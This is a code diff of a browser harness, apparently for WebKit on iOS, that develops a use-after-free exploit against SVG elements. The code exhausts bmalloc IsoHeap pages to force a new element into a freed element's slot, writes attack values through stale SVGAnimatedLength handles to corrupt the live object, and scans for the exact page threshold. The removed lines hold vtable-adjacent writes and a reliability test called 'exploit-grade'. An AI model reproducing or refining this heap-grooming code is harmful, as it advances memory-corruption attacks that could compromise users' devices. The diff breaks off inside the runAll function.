@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SVG UAF v20</title>
+<title>SVG UAF v21</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#0d0d0d;color:#00ff41;font-family:'Courier New',monospace;padding:16px;min-height:100vh}
@@ -18,15 +18,14 @@ button:disabled{opacity:.3}
 </style>
 </head>
 <body>
-<h2>SVG UAF v20 - cross-object corruption - iOS 26.5.2</h2>
-<div class="sub">v20: IsoHeap reuse, live corruption, offset map, vtable-adjacent write</div>
+<h2>SVG UAF v21 - IsoHeap page exhaustion + forced slot reuse</h2>
+<div class="sub">v20: CNF 100/100, RUS -1 (IsoPage too large). v21: pre-exhaust page, force B into A freed slot.</div>
 <div id="stage"><svg id="livesvg" width="200" height="200" viewBox="0 0 100 100"></svg></div>
 <div id="controls">
-  <button onclick="runRUS()">RUS reuse</button>
-  <button onclick="runCOR()">COR corrupt</button>
-  <button onclick="runVTP()">VTP vtable</button>
-  <button onclick="runOFS()">OFS offset</button>
-  <button onclick="runCNF()">CNF confirm</button>
+  <button onclick="runEXH()">EXH exhaust-page</button>
+  <button onclick="runRUS()">RUS force-reuse</button>
+  <button onclick="runCOR()">COR live-corrupt</button>
+  <button onclick="runSCN()">SCN scan-threshold</button>
   <button onclick="runAll()">RUN ALL</button>
   <button onclick="copyLog()">COPY</button>
   <button onclick="clearLog()">CLR</button>
@@ -50,9 +49,7 @@ function tick() { return new Promise(function(r){ setTimeout(r, 0); }); }
 function micro() { return new Promise(function(r){ queueMicrotask(r); }); }
 
 function copyLog() {
-  try {
-    navigator.clipboard.writeText(Lel.innerText);
-  } catch(e) {
+  try { navigator.clipboard.writeText(Lel.innerText); } catch(e) {
     var a = document.createElement('textarea');
     a.value = Lel.innerText;
     document.body.appendChild(a);
@@ -62,31 +59,23 @@ function copyLog() {
   }
 }
 function clearLog() { Lel.innerHTML = ''; }
-
 function dis(d) {
   var btns = document.querySelectorAll('button');
   for (var i = 0; i < btns.length; i++) {
     var fn = btns[i].getAttribute('onclick') || '';
-    if (fn.indexOf('copy') === -1 && fn.indexOf('clear') === -1 && fn.indexOf('CLR') === -1) {
-      btns[i].disabled = d;
-    }
+    if (fn.indexOf('copy') === -1 && fn.indexOf('clear') === -1) btns[i].disabled = d;
   }
 }
+window.onerror = function(m, u, l, c) { log('[CRASH] ' + m + ' L' + l + ':' + c, 'bad'); return false; };
 
-window.onerror = function(m, u, l, c) {
-  log('[CRASH] ' + m + ' L' + l + ':' + c, 'bad');
-  return false;
-};
-
-function mkRect(w, h, x, y, rx) {
-  w = w || 80; h = h || 80; x = x || 5; y = y || 5; rx = rx || 3;
+function mkRect(w, h, x, y) {
+  w = w || 80; h = h || 80; x = x || 5; y = y || 5;
   var r = document.createElementNS(SVG_NS, 'rect');
   r.setAttribute('x', '' + x);
   r.setAttribute('y', '' + y);
   r.setAttribute('width', '' + w);
   r.setAttribute('height', '' + h);
-  r.setAttribute('rx', '' + rx);
-  r.setAttribute('fill', 'blue');
+  r.setAttribute('fill', 'none');
   return r;
 }
 
@@ -94,416 +83,391 @@ function flush() {
   while (livesvg.firstChild) livesvg.removeChild(livesvg.firstChild);
 }
 
-// RUS: IsoHeap reuse - find alloc count to force slot reuse
-async function runRUS(q) {
-  if (!q) { dis(true); sep(); log('RUS: IsoHeap reuse - find when freed slot gets reused', 'inf'); sep(); }
-  log('[*] free A(w=80), alloc 1..256 new rects, check when animLen_A reads new width', 'ok');
+/*
+ * WHY v20 RUS FAILED:
+ *   bmalloc IsoPage holds more than 256 SVGRectElements.
+ *   New allocs use bump pointer on the CURRENT page.
+ *   Freed slot goes into the free list of its page.
+ *   Free list is only consulted when the current page's bump is exhausted.
+ *   Solution: exhaust the current page BEFORE creating A.
+ *   Then A goes onto a fresh page. Free A -> top of free list on fresh page.
+ *   Next alloc on that page hits free list -> B lands in A's slot.
+ *
+ * STRATEGY v21:
+ *   Step 1 (EXH): alloc many rects with no free -> burn through current IsoPage bump
+ *   Step 2 (RUS): NOW alloc A -> goes to new page. Free A. Alloc B -> hits free list = A's slot.
+ *   Step 3 (COR): confirm animLen_A reads B's values. Write via animLen_A. B shows corrupted value.
+ *
+ * HOW MANY TO EXHAUST?
+ *   SVGRectElement size ~ 256-512 bytes (arm64 with vtable, Node fields, SVG attrs)
+ *   IsoPage size = 16384 bytes (16KB, standard bmalloc)
+ *   Objects per page = 16384 / size
+ *   If size=256 -> 64 per page
+ *   If size=512 -> 32 per page
+ *   If size=128 -> 128 per page
+ *   We don't know exact size. So: scan from 32 to 2048 in doubling steps.
+ *   EXH test: exhaust with N rects, then do A/free/B, check if reuse happens.
+ *   First N where reuse happens = page size in objects.
+ */
 
-  var reuse_at = -1;
-  var reuse_val = null;
-  var BASE_W = 100;
+// EXH: find the IsoPage exhaustion threshold
+async function runEXH(q) {
+  if (!q) { dis(true); sep(); log('EXH: find IsoPage exhaustion threshold', 'inf'); sep(); }
+  log('[*] exhaust with N rects (no free), then alloc A, free A, alloc B', 'ok');
+  log('[*] if animLen_A reads B_width after exhaust -> page was full, B hit free list', 'ok');
+  log('');
 
-  flush(); await raf(); await raf();
+  var found_threshold = -1;
+  var exhaust_counts = [32, 64, 96, 128, 192, 256, 384, 512, 768, 1024, 1536, 2048];
 
-  var A = mkRect(80);
-  livesvg.appendChild(A);
-  await raf(); await raf();
-
-  var animW_A = A.width;
-  var bv_A = animW_A ? animW_A.baseVal : null;
-  var A_w = bv_A ? bv_A.value : null;
-  log('  A created: w=' + A_w + ' (expected 80)', 'ok');
-
-  A.remove();
-  await micro();
-
-  var freed_read = null;
-  try { freed_read = bv_A ? bv_A.value : null; } catch(e) {}
-  log('  A freed: animLen_A reads ' + freed_read + ' (should still be 80)', 'ok');
-
-  var alloced = [];
-  for (var i = 0; i < 256; i++) {
-    var w = BASE_W + i;
-    var nr = mkRect(w, w);
-    livesvg.appendChild(nr);
-    alloced.push(nr);
-
-    var curr = null;
-    try { curr = bv_A ? bv_A.value : null; } catch(e) {}
-
-    if (curr !== A_w && curr !== null) {
-      reuse_at = i;
-      reuse_val = curr;
-      log('  [!!] SLOT REUSE at alloc #' + i + ': animLen_A now reads ' + curr, 'bad');
-      log('  new rect w=' + w + ' landed in freed slot', 'bad');
-      var confirmW = null;
-      try { confirmW = alloced[i].width.baseVal.value; } catch(e) {}
-      log('  alloced[' + i + '].width.baseVal = ' + confirmW, 'ok');
-      break;
-    }
-
-    if (i > 0 && i % 64 === 0) {
-      log('  after ' + i + ' allocs: animLen_A still reads ' + curr, 'dim');
-    }
-  }
-
-  if (reuse_at === -1) {
-    var final_read = null;
-    try { final_read = bv_A ? bv_A.value : null; } catch(e) {}
-    log('  no reuse after 256 allocs - animLen_A still reads ' + final_read, 'inf');
-    log('  [*] IsoPage bump > 256 rects threshold', 'inf');
-  } else {
-    log('  RESULT: reuse_at=' + reuse_at + ' reuse_val=' + reuse_val, 'bad');
-  }
-
-  flush(); await raf();
-  if (!q) dis(false);
-  return { reuse_at: reuse_at, reuse_val: reuse_val, A_w: A_w };
-}
-
-// COR: live corruption - write via freed A into live B
-async function runCOR(q) {
-  if (!q) { dis(true); sep(); log('COR: live corruption - write via freed A into live B', 'inf'); sep(); }
-  log('[*] free A, write ATTACK via animLen_A, alloc B nearby, check if B shows ATTACK', 'ok');
-
-  var corruptionConfirmed = false;
-  var ATTACK = 4242.0;
-
-  // Phase 1: write into freed slot, then alloc many B's looking for reuse
-  flush(); await raf(); await raf();
-
-  var A1 = mkRect(80);
-  livesvg.appendChild(A1);
-  await raf(); await raf();
-
-  var bv_A1 = A1.width ? A1.width.baseVal : null;
-  A1.remove();
-  await micro();
-
-  var MAGIC = 7654.0;
-  try { if (bv_A1) bv_A1.value = MAGIC; } catch(e) {}
-  var confirmMagic = null;
-  try { confirmMagic = bv_A1 ? bv_A1.value : null; } catch(e) {}
-  log('  Phase1: wrote MAGIC=' + MAGIC + ' into freed slot, readback=' + confirmMagic, 'inf');
-
-  var victims = [];
-  for (var i = 0; i < 256; i++) {
-    var B = mkRect(42 + i);
-    livesvg.appendChild(B);
-    victims.push(B);
-
-    var curr = null;
-    try { curr = bv_A1 ? bv_A1.value : null; } catch(e) {}
-
-    if (curr !== MAGIC && curr !== null && curr !== 0) {
-      log('  Phase1: slot reused at i=' + i + ' animLen_A reads ' + curr + ' (B.width=' + (42+i) + ')', 'bad');
-      try { if (bv_A1) bv_A1.value = 9999; } catch(e) {}
-      var bW = null;
-      try { bW = victims[i].width ? victims[i].width.baseVal.value : null; } catch(e) {}
-      var bBBox = null;
-      try { bBBox = victims[i].getBBox ? victims[i].getBBox().width : null; } catch(e) {}
-      log('  wrote 9999 via animLen_A - B.width.baseVal=' + bW + ' B.getBBox().w=' + bBBox, 'bad');
-      if (bW === 9999 || bBBox === 9999) {
-        corruptionConfirmed = true;
-        log('  [!!] LIVE CORRUPTION CONFIRMED: B.width=' + bW + ' without setAttribute!', 'bad');
-      }
-      break;
-    }
-  }
-
-  flush(); await raf();
-
-  // Phase 2: adjacent alloc approach
-  log('  Phase2: rapid alloc/free pairs to find adjacent heap elements...', 'inf');
-  var found = false;
-
-  for (var attempt = 0; attempt < 20 && !found; attempt++) {
-    flush(); await raf();
-
-    var A2 = mkRect(80);
-    livesvg.appendChild(A2);
-    await raf();
-    var bv_A2 = A2.width ? A2.width.baseVal : null;
-
-    var B2 = mkRect(55);
-    livesvg.appendChild(B2);
-    await raf();
-    var bv_B2 = B2.width ? B2.width.baseVal : null;
-    var B_preW = bv_B2 ? bv_B2.value : null;
-
-    A2.remove();
-    await micro();
-    try { if (bv_A2) bv_A2.value = ATTACK; } catch(e) {}
-
-    var B_postW = null;
-    try { B_postW = bv_B2 ? bv_B2.value : null; } catch(e) {}
-    var B_bbox = null;
-    try { B_bbox = B2.getBBox ? B2.getBBox().width : null; } catch(e) {}
-    var B_native = null;
-    try { B_native = B2.width ? B2.width.baseVal.value : null; } catch(e) {}
-
-    if (B_postW === ATTACK || B_bbox === ATTACK || B_native === ATTACK) {
-      found = true;
-      corruptionConfirmed = true;
-      log('  [!!] CROSS-OBJECT CORRUPTION! attempt=' + attempt, 'bad');
-      log('    B: bv=' + B_postW + ' bbox=' + B_bbox + ' native=' + B_native, 'bad');
-      log('    B shows ATTACK value without setAttribute!', 'bad');
-    } else {
-      if (attempt < 3) {
-        log('  attempt=' + attempt + ': B_postW=' + B_postW + ' bbox=' + B_bbox, 'dim');
-      }
-    }
-
-    flush(); await raf();
-  }
-
-  if (!found) log('  Phase2: no cross-object hit in 20 attempts', 'inf');
-
-  log('[*] COR: corruptionConfirmed=' + corruptionConfirmed, corruptionConfirmed ? 'bad' : 'inf');
-  if (!q) dis(false);
-  return { corruptionConfirmed: corruptionConfirmed };
-}
-
-// VTP: vtable-adjacent write - map sentinel survival into live elements
-async function runVTP(q) {
-  if (!q) { dis(true); sep(); log('VTP: vtable-adjacent - sentinel survival into live B', 'inf'); sep(); }
-  log('[*] write unique sentinels via each gadget, alloc B, check if B shows sentinel', 'ok');
-
-  var SENTINELS = {
-    width:  11110000.0,
-    height: 22220000.0,
-    x:      33330000.0,
-    y:      44440000.0,
-    rx:     55550000.0,
-    ry:     66660000.0
-  };
-  var sentVals = [11110000.0, 22220000.0, 33330000.0, 44440000.0, 55550000.0, 66660000.0];
-
-  var vtpHit = 0;
-
-  for (var trial = 0; trial < 10; trial++) {
+  for (var ei = 0; ei < exhaust_counts.length; ei++) {
+    var N = exhaust_counts[ei];
     flush(); await raf(); await raf();
 
-    var A = mkRect(80, 60);
-    A.setAttribute('rx', '12');
-    A.setAttribute('ry', '7');
-    livesvg.appendChild(A);
-    await raf(); await raf();
-
-    var g = {
-      width:  A.width  ? A.width.baseVal  : null,
-      height: A.height ? A.height.baseVal : null,
-      x:      A.x      ? A.x.baseVal      : null,
-      y:      A.y      ? A.y.baseVal      : null,
-      rx:     A.rx     ? A.rx.baseVal     : null,
-      ry:     A.ry     ? A.ry.baseVal     : null
-    };
-
-    A.remove();
-    await micro();
-
-    var names = ['width','height','x','y','rx','ry'];
-    for (var ni = 0; ni < names.length; ni++) {
-      var nm = names[ni];
-      try { if (g[nm]) g[nm].value = SENTINELS[nm]; } catch(e) {}
+    // Exhaust N rects - keep them alive (no free = they stay in bump alloc space)
+    var exhaust = [];
+    for (var xi = 0; xi < N; xi++) {
+      var ex = mkRect(10 + xi % 50);
+      livesvg.appendChild(ex);
+      exhaust.push(ex);
     }
+    await raf();
 
-    var B = mkRect(42, 42);
-    livesvg.appendChild(B);
-    await micro();
-
-    var B_reads = {};
-    try { B_reads.w  = B.width  ? B.width.baseVal.value   : null; } catch(e) {}
-    try { B_reads.h  = B.height ? B.height.baseVal.value  : null; } catch(e) {}
-    try { B_reads.x  = B.x     ? B.x.baseVal.value        : null; } catch(e) {}
-    try { B_reads.y  = B.y     ? B.y.baseVal.value        : null; } catch(e) {}
-    try { B_reads.rx = B.rx    ? B.rx.baseVal.value       : null; } catch(e) {}
-    try { B_reads.bw = B.getBBox ? B.getBBox().width       : null; } catch(e) {}
-
-    var hits = [];
-    var keys = Object.keys(B_reads);
-    for (var ki = 0; ki < keys.length; ki++) {
-      var v = B_reads[keys[ki]];
-      if (sentVals.indexOf(v) !== -1) hits.push(keys[ki] + '=' + v);
-    }
-
-    if (hits.length > 0) {
-      vtpHit++;
-      log('  trial=' + trial + ': [SENTINEL IN B!] ' + hits.join(' '), 'bad');
-    } else {
-      if (trial < 3) log('  trial=' + trial + ': B=' + JSON.stringify(B_reads) + ' (no sentinel)', 'dim');
-    }
-
-    flush(); await raf();
-  }
-
-  log('[*] VTP: vtpHit=' + vtpHit, vtpHit > 0 ? 'bad' : 'inf');
-  if (!q) dis(false);
-  return { vtpHit: vtpHit };
-}
-
-// OFS: offset map - cross-gadget interference
-async function runOFS(q) {
-  if (!q) { dis(true); sep(); log('OFS: offset map - cross-gadget write interference', 'inf'); sep(); }
-  log('[*] write via gadget X, read all others - shared reads = shared memory offset', 'ok');
-
-  flush(); await raf(); await raf();
-
-  var A = mkRect(80, 60);
-  A.setAttribute('rx', '12');
-  A.setAttribute('ry', '7');
-  livesvg.appendChild(A);
-  await raf(); await raf();
-
-  var gadgetNames = ['width','height','x','y','rx','ry'];
-  var gadgets = {
-    width:  A.width  ? A.width.baseVal  : null,
-    height: A.height ? A.height.baseVal : null,
-    x:      A.x      ? A.x.baseVal      : null,
-    y:      A.y      ? A.y.baseVal      : null,
-    rx:     A.rx     ? A.rx.baseVal     : null,
-    ry:     A.ry     ? A.ry.baseVal     : null
-  };
-
-  var preVals = {};
-  for (var pi = 0; pi < gadgetNames.length; pi++) {
-    var pn = gadgetNames[pi];
-    try { preVals[pn] = gadgets[pn] ? gadgets[pn].value : null; } catch(e) {}
-  }
-  log('  pre-free: ' + gadgetNames.map(function(k){ return k+'='+preVals[k]; }).join(' '), 'ok');
-
-  A.remove();
-  await micro();
-
-  var postVals = {};
-  for (var qi = 0; qi < gadgetNames.length; qi++) {
-    var qn = gadgetNames[qi];
-    try { postVals[qn] = gadgets[qn] ? gadgets[qn].value : null; } catch(e) {}
-  }
-  log('  post-free: ' + gadgetNames.map(function(k){ return k+'='+postVals[k]; }).join(' '), 'ok');
-
-  var offsetMap = {};
-  var MAGIC_BASE = 111111.0;
-
-  log('  Cross-gadget interference map:', 'inf');
-
-  for (var wi = 0; wi < gadgetNames.length; wi++) {
-    var writerName = gadgetNames[wi];
-    var writerBV = gadgets[writerName];
-
-    // reset all to pre values
-    for (var ri = 0; ri < gadgetNames.length; ri++) {
-      var rn = gadgetNames[ri];
-      try { if (gadgets[rn]) gadgets[rn].value = preVals[rn]; } catch(e) {}
-    }
-
-    var MAGIC = MAGIC_BASE + wi * 1000;
-    try { if (writerBV) writerBV.value = MAGIC; } catch(e) {}
-
-    var readbacks = {};
-    for (var rri = 0; rri < gadgetNames.length; rri++) {
-      var rrn = gadgetNames[rri];
-      try { readbacks[rrn] = gadgets[rrn] ? gadgets[rrn].value : null; } catch(e) {}
-    }
-
-    var shared = [];
-    for (var si = 0; si < gadgetNames.length; si++) {
-      var sn = gadgetNames[si];
-      var sv = readbacks[sn];
-      if (sv !== null && Math.abs(sv - MAGIC) < 0.01) shared.push(sn);
-    }
-
-    offsetMap[writerName] = shared;
-    log('  write ' + writerName + '=' + MAGIC + ' -> shared: [' + shared.join(',') + ']', 'inf');
-  }
-
-  log('  Offset groups:', 'inf');
-  var seen = {};
-  var groups = [];
-  for (var gi = 0; gi < gadgetNames.length; gi++) {
-    var gk = gadgetNames[gi];
-    var gshared = offsetMap[gk];
-    if (!seen[gk] && gshared.length > 1) {
-      groups.push(gshared);
-      for (var gsi = 0; gsi < gshared.length; gsi++) seen[gshared[gsi]] = true;
-      log('  Group: [' + gshared.join(', ') + ']', 'bad');
-    }
-  }
-  if (groups.length === 0) {
-    log('  All gadgets write to distinct offsets - max write surface', 'ok');
-  }
-
-  flush(); await raf();
-  if (!q) dis(false);
-  return { offsetMap: offsetMap, groups: groups };
-}
-
-// CNF: confirm primitive - 100 iterations
-async function runCNF(q) {
-  if (!q) { dis(true); sep(); log('CNF: confirm primitive - 100 iterations reliability', 'inf'); sep(); }
-  log('[*] free A, write 4 distinct values via width/height/x/y gadgets, read back', 'ok');
-
-  var confirmed = 0;
-  var ATTACK_VAL = 31337.0;
-
-  for (var t = 0; t < 100; t++) {
-    flush(); await raf();
-
+    // Now alloc A on (hopefully) a fresh page
     var A = mkRect(80);
     livesvg.appendChild(A);
     await raf();
 
-    var bvW = A.width  ? A.width.baseVal  : null;
-    var bvH = A.height ? A.height.baseVal : null;
-    var bvX = A.x      ? A.x.baseVal      : null;
-    var bvY = A.y      ? A.y.baseVal      : null;
+    var bv_A = A.width ? A.width.baseVal : null;
+    var A_w = bv_A ? bv_A.value : null;
 
-    var preW = bvW ? bvW.value : null;
-
+    // Free A -> should go to top of free list on its page
     A.remove();
+    await micro();
 
-    try { if (bvW) bvW.value = ATTACK_VAL;     } catch(e) {}
-    try { if (bvH) bvH.value = ATTACK_VAL + 1; } catch(e) {}
-    try { if (bvX) bvX.value = ATTACK_VAL + 2; } catch(e) {}
-    try { if (bvY) bvY.value = ATTACK_VAL + 3; } catch(e) {}
+    // Alloc B -> if page was exhausted, bmalloc falls back to free list -> B = A's slot
+    var B_W = 55;
+    var B = mkRect(B_W);
+    livesvg.appendChild(B);
+    await micro();
 
-    var rW = null, rH = null, rX = null, rY = null;
-    try { rW = bvW ? bvW.value : null; } catch(e) {}
-    try { rH = bvH ? bvH.value : null; } catch(e) {}
-    try { rX = bvX ? bvX.value : null; } catch(e) {}
-    try { rY = bvY ? bvY.value : null; } catch(e) {}
+    var curr = null;
+    try { curr = bv_A ? bv_A.value : null; } catch(e) {}
 
-    var ok = (rW === ATTACK_VAL) && (rH === ATTACK_VAL + 1) && (rX === ATTACK_VAL + 2) && (rY === ATTACK_VAL + 3);
-    if (ok) confirmed++;
+    var reused = (curr !== null && curr !== A_w && Math.abs(curr - B_W) < 1);
 
-    if (t < 5 || !ok) {
-      log('  t' + t + ': pre=' + preW + ' wrote ' + ATTACK_VAL + '+ read(' + rW + ',' + rH + ',' + rX + ',' + rY + ') ' + (ok ? 'OK' : 'FAIL'), ok ? 'ok' : 'bad');
+    log('  N=' + N + ': animLen_A reads ' + curr + ' (A_w=' + A_w + ' B_w=' + B_W + ') reused=' + reused, reused ? 'bad' : 'dim');
+
+    if (reused) {
+      found_threshold = N;
+      log('  [!!] PAGE EXHAUSTED at N=' + N + ': B landed in A freed slot!', 'bad');
+      log('  animLen_A reads B_w=' + curr + ' -> m_contextElement now points to B', 'bad');
+
+      // Confirm: write via animLen_A, check B
+      try { if (bv_A) bv_A.value = 9999; } catch(e) {}
+      var bW = null;
+      try { bW = B.width ? B.width.baseVal.value : null; } catch(e) {}
+      var bBBox = null;
+      try { bBBox = B.getBBox ? B.getBBox().width : null; } catch(e) {}
+      log('  write 9999 via animLen_A -> B.width.baseVal=' + bW + ' B.getBBox()=' + bBBox, 'bad');
+      if (bW === 9999 || bBBox === 9999) {
+        log('  [!!] LIVE CORRUPTION CONFIRMED via exhaust method!', 'bad');
+      }
+      flush(); await raf();
+      break;
     }
+
+    flush(); await raf();
   }
 
-  log('[*] CNF: confirmed=' + confirmed + '/100', 'bad');
-  var pct = (confirmed / 100 * 100).toFixed(1);
-  log('[*] UAF write reliability: ' + pct + '%', confirmed >= 90 ? 'bad' : 'inf');
-  if (confirmed >= 90) {
-    log('[!!] exploit-grade primitive confirmed', 'bad');
+  if (found_threshold === -1) {
+    log('  no reuse found up to 2048 exhaust allocs', 'inf');
+    log('  [*] IsoPage is very large or exhaust rects are being freed by GC', 'inf');
+    log('  [*] try SCN for finer-grained scan', 'inf');
+  } else {
+    log('  RESULT: threshold=' + found_threshold, 'bad');
   }
 
   if (!q) dis(false);
-  return { confirmed: confirmed };
+  return { found_threshold: found_threshold };
+}
+
+// RUS: forced reuse using exhaust + controlled A/B sequence
+async function runRUS(q) {
+  if (!q) { dis(true); sep(); log('RUS: forced slot reuse via page exhaustion', 'inf'); sep(); }
+  log('[*] exhaust 512 rects, alloc A(w=80), free A, alloc B(w=55), check animLen_A', 'ok');
+  log('[*] also try: exhaust, free all exhaust, alloc A, free A, alloc B', 'ok');
+  log('');
+
+  var reuse_confirmed = false;
+
+  // Method 1: exhaust KEEP ALIVE then alloc A/B
+  for (var method = 1; method <= 3; method++) {
+    flush(); await raf(); await raf();
+    log('  Method ' + method + ':', 'inf');
+
+    var exhaust = [];
+    var EXHAUST_N = method === 1 ? 512 : method === 2 ? 1024 : 256;
+
+    // Alloc exhaust rects
+    for (var xi = 0; xi < EXHAUST_N; xi++) {
+      var ex = mkRect(20);
+      livesvg.appendChild(ex);
+      exhaust.push(ex);
+    }
+
+    if (method === 2) {
+      // Method 2: also free the exhaust rects to fill free list, then alloc A
+      // A goes to free list head -> B should also get free list head
+      for (var fi = exhaust.length - 1; fi >= 0; fi--) {
+        exhaust[fi].remove();
+      }
+      exhaust = [];
+      await raf();
+    }
+
+    if (method === 3) {
+      // Method 3: free exhaust in FORWARD order then alloc A
+      for (var fi2 = 0; fi2 < exhaust.length; fi2++) {
+        exhaust[fi2].remove();
+      }
+      exhaust = [];
+      await raf();
+    }
+
+    await raf();
+
+    // Alloc A
+    var A = mkRect(80);
+    livesvg.appendChild(A);
+    await raf();
+    var bv_A = A.width ? A.width.baseVal : null;
+    var A_w = bv_A ? bv_A.value : null;
+
+    // Free A
+    A.remove();
+    await micro();
+
+    var freed_val = null;
+    try { freed_val = bv_A ? bv_A.value : null; } catch(e) {}
+    log('    after free: animLen_A=' + freed_val + ' (A_w=' + A_w + ')', 'ok');
+
+    // Alloc B with distinct width
+    var B_W = 55;
+    var B = mkRect(B_W);
+    livesvg.appendChild(B);
+    await micro();
+
+    var curr = null;
+    try { curr = bv_A ? bv_A.value : null; } catch(e) {}
+    var reused = curr !== null && curr !== A_w && Math.abs(curr - B_W) < 1;
+
+    log('    B alloc: animLen_A=' + curr + ' (B_w=' + B_W + ') reused=' + reused, reused ? 'bad' : 'dim');
+
+    if (reused) {
+      reuse_confirmed = true;
+      log('    [!!] SLOT REUSE CONFIRMED method=' + method, 'bad');
+
+      // Write through animLen_A into live B
+      try { if (bv_A) bv_A.value = 9999; } catch(e) {}
+      var bW = null;
+      try { bW = B.width ? B.width.baseVal.value : null; } catch(e) {}
+      var bBBox = null;
+      try { bBBox = B.getBBox ? B.getBBox().width : null; } catch(e) {}
+      log('    write 9999 via animLen_A -> B.width=' + bW + ' bbox=' + bBBox, 'bad');
+
+      if (bW === 9999 || bBBox === 9999) {
+        log('    [!!] LIVE OBJECT CORRUPTION VIA UAF!', 'bad');
+      }
+      flush(); await raf();
+      break;
+    }
+
+    flush(); await raf();
+  }
+
+  log('[*] RUS: reuse_confirmed=' + reuse_confirmed, reuse_confirmed ? 'bad' : 'inf');
+  if (!q) dis(false);
+  return { reuse_confirmed: reuse_confirmed };
+}
+
+// COR: full live corruption demo once we know threshold
+async function runCOR(q) {
+  if (!q) { dis(true); sep(); log('COR: live corruption - full structured demo', 'inf'); sep(); }
+  log('[*] exhaust page, free A, force B into slot, write ATTACK, verify B corrupted', 'ok');
+  log('');
+
+  var ATTACK = 31337.0;
+  var corruptConfirmed = false;
+
+  // Try multiple exhaust counts
+  var counts = [256, 512, 768, 1024, 1536, 2048];
+
+  for (var ci = 0; ci < counts.length; ci++) {
+    var N = counts[ci];
+    flush(); await raf(); await raf();
+
+    // Exhaust
+    var exhaust = [];
+    for (var xi = 0; xi < N; xi++) {
+      var ex = mkRect(10);
+      livesvg.appendChild(ex);
+      exhaust.push(ex);
+    }
+    await raf();
+
+    // Alloc A
+    var A = mkRect(80);
+    livesvg.appendChild(A);
+    await raf();
+    var bv_A = A.width ? A.width.baseVal : null;
+    var A_w = bv_A ? bv_A.value : null;
+
+    // Free A
+    A.remove();
+    await micro();
+
+    // Alloc B
+    var B = mkRect(55);
+    livesvg.appendChild(B);
+    await micro();
+
+    var curr = null;
+    try { curr = bv_A ? bv_A.value : null; } catch(e) {}
+    var reused = curr !== null && curr !== A_w;
+
+    if (!reused) {
+      log('  N=' + N + ': no reuse (animLen_A=' + curr + ')', 'dim');
+      flush(); await raf();
+      continue;
+    }
+
+    log('  N=' + N + ': REUSE! animLen_A=' + curr + ' (was ' + A_w + ', B_w=55)', 'bad');
+
+    // Write ATTACK via animLen_A while B is live
+    try { if (bv_A) bv_A.value = ATTACK; } catch(e) {}
+    await micro();
+
+    // Read B through its own JS interface
+    var bW_bv = null;
+    try { bW_bv = B.width ? B.width.baseVal.value : null; } catch(e) {}
+    var bW_bbox = null;
+    try { bW_bbox = B.getBBox ? B.getBBox().width : null; } catch(e) {}
+    var bW_anim = null;
+    try { bW_anim = B.width ? B.width.animVal.value : null; } catch(e) {}
+
+    log('  B.width.baseVal = ' + bW_bv, bW_bv === ATTACK ? 'bad' : 'ok');
+    log('  B.getBBox().w   = ' + bW_bbox, bW_bbox === ATTACK ? 'bad' : 'ok');
+    log('  B.width.animVal = ' + bW_anim, bW_anim === ATTACK ? 'bad' : 'ok');
+
+    if (bW_bv === ATTACK || bW_bbox === ATTACK || bW_anim === ATTACK) {
+      corruptConfirmed = true;
+      log('  [!!] LIVE OBJECT CORRUPTION CONFIRMED at N=' + N, 'bad');
+      log('  [!!] B.width=' + bW_bv + ' without B.setAttribute ever being called', 'bad');
+      log('  [!!] B is a live DOM element with corrupted C++ attribute storage', 'bad');
+
+      // Also corrupt height, x, y to prove multi-field control
+      var bv_H = A.height ? A.height.baseVal : null;
+      var bv_X = A.x ? A.x.baseVal : null;
+      var bv_Y = A.y ? A.y.baseVal : null;
+      try { if (bv_H) bv_H.value = ATTACK + 1; } catch(e) {}
+      try { if (bv_X) bv_X.value = ATTACK + 2; } catch(e) {}
+      try { if (bv_Y) bv_Y.value = ATTACK + 3; } catch(e) {}
+
+      var bH = null, bX = null, bY = null;
+      try { bH = B.height ? B.height.baseVal.value : null; } catch(e) {}
+      try { bX = B.x ? B.x.baseVal.value : null; } catch(e) {}
+      try { bY = B.y ? B.y.baseVal.value : null; } catch(e) {}
+      log('  multi-field: B.height=' + bH + ' B.x=' + bX + ' B.y=' + bY, 'bad');
+      log('  expected:    B.height=' + (ATTACK+1) + ' B.x=' + (ATTACK+2) + ' B.y=' + (ATTACK+3), 'inf');
+      flush(); await raf();
+      break;
+    }
+
+    flush(); await raf();
+  }
+
+  log('[*] COR: corruptConfirmed=' + corruptConfirmed, corruptConfirmed ? 'bad' : 'inf');
+  if (!q) dis(false);
+  return { corruptConfirmed: corruptConfirmed };
+}
+
+// SCN: fine-grained threshold scan
+async function runSCN(q) {
+  if (!q) { dis(true); sep(); log('SCN: fine-grained IsoPage size scan', 'inf'); sep(); }
+  log('[*] scan exhaust counts 1..2048 in steps to find exact page boundary', 'ok');
+  log('[*] binary search: find smallest N where reuse happens', 'ok');
+  log('');
+
+  // Binary search between 1 and 4096
+  var lo = 1, hi = 4096, threshold = -1;
+
+  while (lo <= hi) {
+    var mid = Math.floor((lo + hi) / 2);
+    flush(); await raf();
+
+    var exhaust = [];
+    for (var xi = 0; xi < mid; xi++) {
+      var ex = mkRect(20);
+      livesvg.appendChild(ex);
+      exhaust.push(ex);
+    }
+    await raf();
+
+    var A = mkRect(80);
+    livesvg.appendChild(A);
+    await raf();
+    var bv_A = A.width ? A.width.baseVal : null;
+    var A_w = bv_A ? bv_A.value : null;
+
+    A.remove();
+    await micro();
+
+    var B = mkRect(55);
+    livesvg.appendChild(B);
+    await micro();
+
+    var curr = null;
+    try { curr = bv_A ? bv_A.value : null; } catch(e) {}
+    var reused = curr !== null && curr !== A_w && Math.abs(curr - 55) < 1;
+
+    log('  mid=' + mid + ': animLen_A=' + curr + ' reused=' + reused, reused ? 'bad' : 'dim');
+
+    if (reused) {
+      threshold = mid;
+      hi = mid - 1;
+    } else {
+      lo = mid + 1;
+    }
+
+    flush(); await raf();
+  }
+
+  if (threshold !== -1) {
+    log('  [!!] EXACT THRESHOLD: ' + threshold + ' exhaust rects needed', 'bad');
+    log('  [*] SVGRectElement IsoPage holds ~' + threshold + ' objects', 'bad');
+    log('  [*] obj size ~ ' + Math.round(16384 / threshold) + ' bytes (assuming 16KB IsoPage)', 'inf');
+  } else {
+    log('  threshold > 4096 - IsoPage is unusually large or exhaust being GCd', 'inf');
+    log('  [*] check if exhaust rects survive: try forcing layout between allocs', 'inf');
+  }
+
+  if (!q) dis(false);
+  return { threshold: threshold };
 }
 
 // RUN ALL
 async function runAll() {
   dis(true); clearLog(); sep();
-  log('SVG UAF v20 - cross-object corruption harness', 'inf'); sep();
